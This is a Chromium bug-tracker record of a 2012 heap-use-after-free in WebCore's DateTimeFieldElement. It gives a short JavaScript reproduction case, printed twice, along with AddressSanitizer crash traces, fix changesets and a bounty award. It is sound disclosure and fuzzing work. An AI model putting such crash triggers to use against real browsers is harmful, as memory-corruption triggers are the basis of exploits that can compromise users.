# Heap-use-after-free in WebCore::DateTimeFieldElement::didBlur

| Field | Value |
|-------|-------|
| **Issue ID** | [40076341](https://issues.chromium.org/issues/40076341) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | yo...@chromium.org |
| **Created** | 2012-09-23 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::DateTimeFieldElement::didBlur

**VERSION**  

Chrome Version: dev  

Operating System: linux + osx

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
el0=document.createElement('input')
el0.type='time'
document.body.appendChild(el0)
el0.focus()
document.implementation.createDocument('', '', null).adoptNode(el0)
el0.setAttribute('x', 'y')
el0.setAttribute('type', 'submit')
document.body.appendChild(el0).focus()
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==19353== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffebbc98e0 at pc 0x555559d59987 bp 0x7fffffff7b20 sp 0x7fffffff7b18  

READ of size 8 at 0x7fffebbc98e0 thread T0  

#0 0x555559d59986 in WebCore::DateTimeFieldElement::didBlur() ???:0  

#1 0x555559d58df7 in WebCore::DateTimeFieldElement::defaultEventHandler(WebCore::Event\*) ???:0  

#2 0x555558d01fa1 in WebCore::EventDispatcher::dispatchEventPostProcess(WTF::PassRefPtr[WebCore::Event](javascript:void(0);), void\*) ???:0

0x7fffebbc98e0 is located 96 bytes inside of 216-byte region [0x7fffebbc9880,0x7fffebbc9958)  

freed by thread T0 here:  

#0 0x55555f69a8f0 in operator delete(void\*) ??:0  

#1 0x555558b3a705 in WebCore::ContainerNode::removeAllChildren() ???:0  

#2 0x555559bcc567 in WebCore::InputType::destroyShadowSubtree() ???:0  

#3 0x555559bfa2bd in WebCore::TextFieldInputType::destroyShadowSubtree() ???:0

## Attachments

- [96216.txt](attachments/96216.txt) (text/x-c; charset=us-ascii, 12.8 KB)
- [96216.html](attachments/96216.html) (text/html; charset=us-ascii, 444 B)

## Timeline

### in...@chromium.org (2012-09-23)

Looks like another DateTimeFieldElement regression [like http://trac.webkit.org/changeset/128148]. Please do try to look for similar pattern of bugs so that these reports don't come back to haunt us.

### in...@chromium.org (2012-09-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-09-24)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=114295716

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7feef28ce4e0
Crash State:
  - crash stack -
  WebCore::DateTimeFieldElement::didBlur
  WebCore::DateTimeFieldElement::defaultEventHandler
  - free stack -
  WebCore::ContainerNode::removeAllChildren
  WebCore::InputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=154424:154481

Minimized Testcase (0.38 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94bWyqzW9VV1rnfioaoWee953UtIe7d4yB6QMMfws-B559IVRlwmL1zhx0G2TC6G81pmfXO-Y6n75XJmbELpdmqqzhsy_NJlgSDGqnjOC6QM7WErC5fr3d_lz-YQboKCvbUG2-l_cvtZujyGCRntjsYiQ_2M5Kma_Tup-3oAe1vH2UDqMs
<script>
      onload = function() {
        el0=document.createElement('input')
        el0.type='time'
        document.body.appendChild(el0)
        el0.focus()
        document.implementation.createDocument('', '', null).adoptNode(el0)
        el0.setAttribute('x', 'y')
        el0.setAttribute('type', 'submit')
        document.body.appendChild(el0).focus()
      }
    </script>

### in...@chromium.org (2012-09-24)

looks like a regression from  https://trac.webkit.org/changeset/127226/

### yo...@chromium.org (2012-09-24)

I found the root cause in WebKit.


### in...@chromium.org (2012-09-25)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-09-25)

http://trac.webkit.org/changeset/129448

### yo...@chromium.org (2012-09-25)

Merged: http://trac.webkit.org/changeset/129463

### sc...@gmail.com (2012-09-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2012-09-26)

ClusterFuzz has detected this issue as fixed in range 158615:158661.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=114295716

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7feef28ce4e0
Crash State:
  - crash stack -
  WebCore::DateTimeFieldElement::didBlur
  WebCore::DateTimeFieldElement::defaultEventHandler
  - free stack -
  WebCore::ContainerNode::removeAllChildren
  WebCore::InputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=154424:154481
Fixed: https://cluster-fuzz.appspot.com/revisions?range=158615:158661

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94bWyqzW9VV1rnfioaoWee953UtIe7d4yB6QMMfws-B559IVRlwmL1zhx0G2TC6G81pmfXO-Y6n75XJmbELpdmqqzhsy_NJlgSDGqnjOC6QM7WErC5fr3d_lz-YQboKCvbUG2-l_cvtZujyGCRntjsYiQ_2M5Kma_Tup-3oAe1vH2UDqMs

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-10-02)

Regression catch, great.
$1000

### sc...@gmail.com (2012-10-11)

[Empty comment from Monorail migration]

### yo...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/151860?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076341)*
